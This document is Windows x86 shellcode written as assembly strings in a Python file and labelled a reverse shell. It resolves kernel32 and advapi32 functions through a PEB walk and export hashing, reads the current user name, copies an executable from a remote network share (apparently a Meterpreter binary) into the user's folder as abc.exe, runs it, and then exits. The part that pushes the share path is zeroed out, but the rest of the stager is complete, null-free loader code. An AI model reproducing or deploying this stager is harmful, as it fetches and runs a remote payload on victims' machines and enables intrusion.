# 1. PEB Crawl to "kernel32.dll"
# 2. Resolve addresses of kernel32 functions
#   - LoadLibraryA, CopyFileExA, CreateProcessA, TerminateProcess
# 3. Call LoadLibraryA on "advapi32.dll"
# 4. Resolve addresses of advapi functions
#   - GetUserNameA
# 5. Call GetUserNameA (get current user's name)
# 6. Call CopyFileExA (copy abc.exe to user's directory)
# 7. Call CreateProcess (run abc.exe)
# 8. Call TerminateProcess (end the shellcode process)

### assembly reverse shell ###
ASSEMBLY = (
        "start:                  " #
#       "   int3                ;" # DEBUGGING PURPOSES: Interrupt exec to attach debugger
        "   jmp main            ;" # jump down to main function

        "find_kernel32:          " # find the kernel32 module from PEB LDR
        "   xor ecx, ecx        ;" # zero out ecx
        "   mov esi,fs:[ecx+0x30];"# PEB address (0x30 into the TEB)
        "   mov esi, [esi+0xc]  ;" # Ldr address from PEB (0xC into PEB)
        "   mov esi, [esi+0x1c] ;" # InItOrder head node from Ldr (0x1C into PEB_LDR_DATA)
        "next_module:            " #
        "   mov ebx, [esi+0x8]  ;" # module base address of the node
        "   mov edi, [esi+0x20] ;" # module name
        "   mov esi, [esi]      ;" # flink entry
        "   cmp [edi+12*2], cx  ;" # check for null byte at word 12 (byte 24) of module name
                                   # (terminating word for KERNEL32.DLL in unicode)
        "   jne next_module     ;" # move on to next module if no match
        "   ret                 ;" #

        "find_func:              " #
        "   pushad              ;" # store registers current state to stack
        "   mov eax, [ebx+0x3c] ;" # offset to PE Header start
        "   mov edi, [ebx+eax+0x78];" # offset (RVA, Relative Virtual Addr) to EAT (Export Address Table)
        "   add edi, ebx        ;" # address (VMA, Virtual Memory Addr) of EAT
        "   mov ecx, [edi+0x18] ;" # NumberOfNames (in AddressOfNames)
        "   mov eax, [edi+0x20] ;" # AddressOfNames offset
        "   add eax, ebx        ;" # AddressOfNames start address
        "   mov [ebp-4], eax    ;" # save AddressOfNames to stack
        "find_func_loop:         " #
        "   jecxz find_func_done;" # if ECX 0, jump out of loop
        "   dec ecx             ;" # decrement NumberOfNames counter
        "   mov eax, [ebp-4]    ;" # retrieve AddressOfNames start address
        "   mov esi, [eax+ecx*4];" # AddressOfNames[NumOfNames counter] offset
        "   add esi, ebx        ;" # AddressOfNames[NumOfNames counter] address
        "hash_prep:             ;" #
        "   xor eax, eax        ;" # zero out eax
        "   cdq                 ;" # zero out edx (convert DWORD in eax to qword in edx)
        "   cld                 ;" # clear direction flag, string parse direction set to forward
        "hash_loop:             ;" #
        "   lodsb               ;" # load next byte from esi into al
        "   test al, al         ;" # check for null terminator byte
        "   jz hash_compare     ;" # jump out of loop if null
        "   ror edx, 0x0d       ;" # rotate edx (working hash) 13 bits right
        "   add edx, eax        ;" # add string's byte to hash
        "   jmp hash_loop       ;" # repeat loop
        "hash_compare:           " #
        "   cmp edx, [esp+0x24] ;" # compare computed hash to pushed hash
        "   jnz find_func_loop  ;" # if not equal, go to next func
        "find_func_base:         " #
        "   mov edx, [edi+0x24] ;" # AddressOfNameOrdinals offset
        "   add edx, ebx        ;" # AddressOfNameOrdinals start address
        "   mov cx, [edx+2*ecx] ;" # ordinal = AddressOfNameOrdinals[NumOfNames_counter]
        "   mov edx, [edi+0x1c] ;" # AddressOfFunctions offset
        "   add edx, ebx        ;" # AddressOfFunctions start address
        "   mov eax, [edx+4*ecx];" # AddressOfFunctions[ordinal] = function offset
        "   add eax, ebx        ;" # function address
        "   mov [esp+0x1c], eax ;" # mov function address into stored stack value of eax (for popad)
        "find_func_done:         "
        "   popad               ;" # restore registers saved state
        "   ret                 ;" #

        "main:                   " # upward calls to find funcs (avoids null bytes), then make func calls
        "   mov ebp, esp        ;" # function prologue
        "   add esp, 0xffffff40 ;" # grow stack -0xc0. [esp-0x00 : esp-0x0c] = frame variables space
        "kernel32_funcs:         " #
        "   call find_kernel32  ;" # find kernel32.dll base address
        "   push 0xec0e4e8e     ;" # LoadLibraryA hash
        "   call find_func      ;" # find LoadLibraryA
        "   mov [ebp-0x10], eax ;" # save LoadLibraryA address
        "   push 0x7ee258e7     ;" # CopyFileExA hash
        "   call find_func      ;" # find CopyFileExA
        "   mov [ebp-0x14], eax ;" # save CopyFileExA address
        "   push 0x16b3fe72     ;" # CreateProcessA hash
        "   call find_func      ;" # find CreateProcessA
        "   mov [ebp-0x18], eax ;" # save CreateProcessA address
        "   push 0x78b5b983     ;" # TerminateProcess hash
        "   call find_func      ;" # find TerminateProcess
        "   mov [ebp-0x1c], eax ;" # save TerminateProcess address
        "load_advapi32:          " #
        "   xor eax, eax        ;" #
        "   push eax            ;" # "\x00", string null terminator
        "   push 0x6c6c642e     ;" # ".dll"
        "   push 0x32336970     ;" # "pi32"
        "   push 0x61766461     ;" # "adva"
        "   push esp            ;" # lpLibFileName = pointer to "advapi32.dll"
        "   call DWORD ptr [ebp-0x10];" # call LoadLibraryA on "advapi32.dll"
        "   mov ebx, eax        ;" # store advapi32.dll address
        "advapi32_funcs:         " #
        "   push 0x5c52aa34     ;" # GetUserNameA hash
        "   call find_func      ;" # find GetUserNameA
        "   mov [ebp-0x24], eax ;" # save GetUserNameA address
        "call_getusernamea:     ;" #
        "   xor eax, eax        ;" #
        "   mov al, 0x20        ;" #
        "   mov [ebp-0xa4], eax ;" # input value 0x20 for LPDWORD pcbBuffer
        "   lea eax, [ebp-0xa4] ;" #
        "   push eax            ;" # pcbBuffer = LPDWORD address (ebp-0xa4)
        "   sub eax, 0xfffffffc ;" # -4, moves eax up 4 bytes to ebp-0xa0
        "   push eax            ;" # lpBuffer = LPSTR address (ebp-0xa0)
        "   call DWORD ptr [ebp-0x24];" # call GetUserNameA
        "make_static_strings:     " # 
        "   xor eax, eax        ;" #
        "   add eax, 0x555c3a43 ;" # "C:\U"
        "   mov [ebp-0xc0], eax ;" # move in "C:\U" to pre-allocated stack space
        "   xor eax, eax        ;" #
        "   add eax, 0x73726573 ;" # "sers"
        "   mov [ebp-0xbc], eax ;" # move in "sers" to pre-allocated stack space
        "   xor eax, eax        ;" #
        "   add al, 0x5c        ;" # "\" with following NULL
        "   mov [ebp-0xb8], eax ;" # move in "\" to pre-allocated stack space, final string "C:\Users\"
        "   xor eax, eax        ;" #
        "   add eax, 0x6362615c ;" # "\abc"
        "   mov [ebp-0xb0], eax ;" # move in "\abc" to pre-allocated stack space
        "   xor eax, eax        ;" #
        "   add eax, 0x6578652e ;" # ".exe"
        "   mov [ebp-0xac], eax ;" # move in ".exe" to pre-allocated stack space
        "   xor eax, eax        ;" #
        "   mov [ebp-0xa8], eax ;" # move in NULL to pre-allocated stack space, final string "\abc.exe"
        "   jmp make_lpnewfilename;" # jump over copy_loop, enables upward calls (avoids null bytes)

        "copy_loop:              " #
        "   mov al, [esi]       ;" # take next source char
        "   test al, al         ;" # check if 0 (Null byte)
        "   jz copy_done        ;" # jump out if null
        "   mov [edi], al       ;" # copy source char into dest buffer
        "   inc esi             ;" # increment source pointer
        "   inc edi             ;" # increment destination pointer
        "   jmp copy_loop       ;" # repeat
        "copy_done:              " #h
        "   ret                 ;" #

        "make_lpnewfilename:     " #
        "   lea edi, [ebp-0x80] ;" # set destination to lpNewFileName
        "   lea esi, [ebp-0xc0] ;" # set source to "C:\Users\" string
        "   call copy_loop      ;" # add "C:\Users\" to lpNewFileName
        "   lea esi, [ebp-0xa0] ;" # set source to lpBuffer (retrieved username) 
        "   call copy_loop      ;" # add lpBuffer to lpNewFileName
        "   lea esi, [ebp-0xb0] ;" # set source to "\abc.exe" string
        "   call copy_loop      ;" # add "\abc.exe" to lpNewFileName
        "   xor eax, eax        ;" #
        "   mov [edi], al       ;" # add NULL byte to lpNewFileName
        "call_copyfileexa:       " #
        "   xor eax, eax        ;" #
        "   mov al, 0x65        ;" #
        "   push eax            ;" # "e" with following NULL
        "   push 0x00000000     ;" # "c.ex"
        "   push 0x00000000     ;" # "M\ab"
        "   push 0x00000000     ;" # "d\RE"
        "   push 0x00000000     ;" # "mote"
        "   push 0x00000000     ;" # "\\re"
        "   mov edi, esp        ;" # save pointer to lpExistingFileName string
        "   xor eax, eax        ;" #
        "   push eax            ;" # dwCopyFlags = 0
        "   push eax            ;" # pbCancel = 0
        "   push eax            ;" # lpData = 0
        "   push eax            ;" # lpProgressRoutine = 0
        "   lea eax, [ebp-0x80] ;" # 
        "   push eax            ;" # lpNewFileName = pointer to "C:\Users\{USERNAME}\abc.exe"
        "   push edi            ;" # lpExistingFileName = "\\remoted\REM\met.exe"
        "   call DWORD ptr [ebp-0x14];" # call CopyFileExA
        "cpa_startupinfoa:       " #
        "   xor eax, eax        ;" #
        "   push eax            ;" # hStdError = 0
        "   push eax            ;" # hStdOutput = 0
        "   push eax            ;" # hStdInput = 0
        "   push eax            ;" # lpReserved2 = 0
        "   push eax            ;" # cbReserved2 & wShowWindow = 0
        "   push eax            ;" # dwFlags = 0 (NONE)
        "   push eax            ;" # dwFillAttribute = 0
        "   push eax            ;" # dwYCountChars = 0
        "   push eax            ;" # dwXCountChars = 0
        "   push eax            ;" # dYSize  = 0
        "   push eax            ;" # dXSize = 0
        "   push eax            ;" # dwY = 0
        "   push eax            ;" # dwX = 0
        "   push eax            ;" # lpTitle = 0
        "   push eax            ;" # lpDesktop = 0
        "   push eax            ;" # lpReserved = 0
        "   mov al, 0x44        ;" #
        "   push eax            ;" # cb = 0x44 (size of STARTUPINFOA struct)
        "   mov edi, esp        ;" # save STARTUPINFOA address
        "call_createprocessa:    " #
        "   lea eax, [ebp-0x40] ;" #
        "   push eax            ;" # lpProcessInformation [out] = buffer at ebp-0x40
        "   push edi            ;" # lpStartupInfo = STARTUPINFOA struct address
        "   xor eax, eax        ;" #
        "   push eax            ;" # lpCurrentDirectory = 0
        "   push eax            ;" # lpEnvironment = 0
        "   push eax            ;" # dwCreationFlags = 0
        "   inc eax             ;" #
        "   push eax            ;" # bInheritHandles = TRUE (1)
        "   dec eax             ;" #
        "   push eax            ;" # lpThreadAttributes = 0
        "   push eax            ;" # lpProcessAttributes = 0
        "   push eax            ;" # lpCommandLine = 0
        "   lea eax, [ebp-0x80] ;" # 
        "   push eax            ;" # lpApplicationName = *lpNewFileName ("C:\Users\{USERNAME}\abc.exe") at ebp-0x80
        "   call [ebp-0x18]     ;" # call CreateProcessA
        "call_terminateprocess:  " #
        "   xor ecx, ecx        ;" #
        "   push ecx            ;" # uExitCode = 0
        "   push 0xffffffff     ;" # hProcess = self (-1)
        "   call [ebp-0x1c]     ;" # call TerminateProcess
        "   nop                 ;" # END. This should never execute
)
